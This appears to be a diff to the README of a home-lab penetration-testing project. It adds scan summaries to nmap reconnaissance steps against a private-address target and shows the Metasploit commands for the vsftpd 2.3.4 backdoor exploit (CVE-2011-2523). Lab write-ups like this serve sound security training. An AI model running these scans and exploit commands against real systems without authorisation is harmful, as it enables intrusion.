@@ -25,15 +25,27 @@ This project simulates an internal network attack scenario using Kali Linux (att
 #### Basic Nmap Scan
 ```bash
 nmap -sS -T4 192.168.64.3 -oN basic-scan.txt
-
+```
+Summary:
+  Open Ports: 21 (FTP), 22 (SSH), 23 (Telnet), 80 (HTTP)
+  
 #### Service Version Detection
 ```bash
 nmap -sS -sV -T4 192.168.64.3 -oN version-scan.txt
-
+```
+Summary:
+  FTP: vsftpd 2.3.4
+  SSH: OpenSSH 4.7p1 Debian
+  HTTP: Apache 2.2.8
+  
 #### Vulnerability Detection
 ```bash
 nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt
-
+```
+Summary: 
+  Port 21 - VULNERABLE to vsftpd 2.3.4 backdoor (CVE-2011-2523)
+  Port 22 - 
+  Port 80 - Apache version outdated with multiple CVEs
 ---
 
 ## Phase 2: Exploitation
@@ -46,3 +58,4 @@ nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST 192.168.64.3
 exploit
+```
